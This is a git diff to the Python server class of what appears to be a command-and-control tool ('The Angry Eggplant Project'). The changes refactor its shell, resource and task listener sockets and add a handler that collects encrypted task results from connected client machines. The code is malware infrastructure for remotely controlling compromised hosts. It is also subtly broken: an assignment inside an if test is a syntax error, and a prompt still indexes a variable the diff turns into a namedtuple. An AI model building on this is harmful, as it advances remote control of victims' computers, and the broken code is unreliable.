@@ -81,7 +81,7 @@ class Server(threading.Thread):
     SOFTWARE.
     '''
 
-    global threads
+    global server
 
     banner = open('../resources/banner.txt', 'r').read() if os.path.isfile('../resources/banner.txt') else str('\n' * 30 + '\tThe Angry Eggplant Project')
 
@@ -211,10 +211,10 @@ class Server(threading.Thread):
             s1.listen(10)
             s2.listen(10)
             s3.listen(10)
-            servers = collections.namedtuple('Servers', ['shell','resource','task'])
-            return servers(s1, s2, s3)
+            sockets = collections.namedtuple('Sockets', ['shell','resource','task'])
+            return sockets(s1, s2, s3)
         except Exception as e:
-            return "{} error: {}".format(self._get_connection.func_name, str(e))
+            return "{} error: {}".format(self._get_sockets.func_name, str(e))
 
     def _get_handlers(self):
         try:
@@ -224,7 +224,11 @@ class Server(threading.Thread):
             t2 = threading.Thread(target=self.resource_handler, name=time.time())
             t2.daemon = True
             t2.start()
-            threads.update({'shell_handler': t1, 'resource_handler': t2})
+            t3 = threading.Thread(target=self.task_handler, name=time.time())
+            t3.daemon = True
+            t3.start()
+            handler = collections.namedtuple('Handlers', ['shell','resource','task'])
+            return handler(t1, t2, t3)
         except Exception as e:
             return "{} error: {}".format(self._get_handlers.func_name, str(e))
 
@@ -252,7 +256,6 @@ class Server(threading.Thread):
         except Exception as e:
             return "{} error: {}".format(self._execute_sql.func_name, str(e))
             
-
     def _encrypt(self, data, key):
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
         ciphertext, tag = cipher.encrypt_and_digest(data)
@@ -647,6 +650,28 @@ class Server(threading.Thread):
             self.display(json.dumps(client.info))
             print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd() if not self.current_client else self.current_client.prompt % int(self.current_client.name)), end="")
 
+    def task_handler(self):
+        while True:
+            connection, addr = self._sockets.task.accept()
+            client = None
+            try:
+                for c in self.get_clients():
+                    if c.address[0] = addr[0]:
+                        client = c
+                if client:
+                    buf = ''
+                    while '\n' not in buf:
+                        buf += connection.recv(4096)
+                    data = self.decrypt(buf.rstrip(), client.name)
+                    try:
+                        self.save_task_results(json.loads(data))
+                    except Exception as e:
+                        print("{} error: {}".format(self.task_handler.func_name, str(e)))
+            finally:
+                connection.shutdown(socket.SHUT_RDWR)
+                connection.close()
+            
+                
     def resource_handler(self):
         while True:
             connection, addr = self._sockets.resource.accept()
@@ -734,7 +759,7 @@ class Server(threading.Thread):
 
 class ClientHandler(threading.Thread):
 
-    global threads
+    global server
 
     _prompt     = None
 
@@ -743,7 +768,7 @@ class ClientHandler(threading.Thread):
         self.connection     = connection
         self.shell          = threading.Event()
         self.lock           = threading.Lock()
-        self.conifg         = self._config(**kwargs)
+        self.config         = self._config(**kwargs)
         self.session_key    = self._session_key()
         self.info           = self._info()
         self.session        = self._session()
@@ -764,10 +789,6 @@ class ClientHandler(threading.Thread):
                     pass
             except Exception as e:
                 self._error(str(e))
-
-    def _error(self, data):
-        with self.lock:
-            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
 
     def _kill(self):
         self.shell.clear()
@@ -840,6 +861,10 @@ class ClientHandler(threading.Thread):
         except Exception as e2:
             self._error(str(e2))
 
+    def _error(self, data):
+        with self.lock:
+            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
+
     def prompt(self, data):
         with self.lock:
             return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + '\n' + bytes(data).rstrip())
@@ -894,9 +919,9 @@ class ClientHandler(threading.Thread):
 
 if __name__ == '__main__':
     colorama.init()
-    threads = collections.OrderedDict()
+    threads = collections.namedtuple('Server', ['shell','resource','task'])
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
     debug = True if 'debug' in sys.argv else (True if '--debug' in sys.argv else False)
-    threads['server'] = Server(port=port, debug=debug)
-    threads['server'].start()
+    server = Server(port=port, debug=debug)
+    server.start()
  
